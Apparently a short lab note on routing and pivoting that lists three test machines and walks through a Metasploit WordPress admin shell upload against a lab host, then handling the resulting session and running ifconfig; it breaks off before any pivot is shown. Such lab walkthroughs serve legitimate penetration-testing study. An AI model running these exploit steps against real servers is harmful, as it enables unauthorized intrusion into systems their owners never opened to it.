# Routing and Pivoting

We have 3 machines: Pentesting, Beta and Windows XP.

Pentesting is in the range of 100.
Beta is in the range of 100 and 148.
Windows XP is in the range of 148.

Bascically, we'll use the Beta machine to enter the 148 range.

```bash
ping beta.hackerinthehouse.com
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
show options
set PASSWORD password
set USERNAME username
set RHOSTS url
run
```

Now the shell is opened.

We can backgroung it by typing `ctrl+Z`.

```bash
sessions
```

This shows us the sessions opened.

```bash
sessions -i 1
shell
```

This allow us to use the shell of the webserver.

```bash
ifconfig
```
